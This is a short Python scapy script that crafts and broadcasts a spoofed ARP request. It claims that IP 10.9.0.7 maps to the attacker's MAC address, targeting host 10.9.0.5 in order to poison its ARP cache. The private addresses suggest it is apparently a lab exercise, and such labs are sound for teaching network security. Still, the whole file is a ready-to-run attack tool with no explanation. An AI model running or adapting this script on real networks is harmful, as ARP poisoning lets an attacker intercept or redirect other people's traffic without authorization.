#!/usr/bin/env python3
from scapy.all import *

# Fake details
VICTIM_IP = "10.9.0.5"      # Target IP (who will get poisoned)
TARGET_MAC = "02:42:0a:09:00:05"  # MAC of the target (victim)
FAKE_IP = "10.9.0.7"        # Pretend to be this IP
ATTACKER_MAC = "02:42:0a:09:00:69"

print("SENDING SPOOFED ARP REQUEST...")

# Craft Ethernet Frame
ether = Ether(dst="ff:ff:ff:ff:ff:ff", src=ATTACKER_MAC)

# Craft ARP Request
arp = ARP()
arp.op = 1  # 1 = ARP Request
arp.hwsrc = ATTACKER_MAC
arp.psrc = FAKE_IP
arp.pdst = VICTIM_IP
arp.hwdst = "00:00:00:00:00:00"  # Standard for ARP Request

# Combine and send
packet = ether / arp
sendp(packet, iface="eth0", verbose=False)
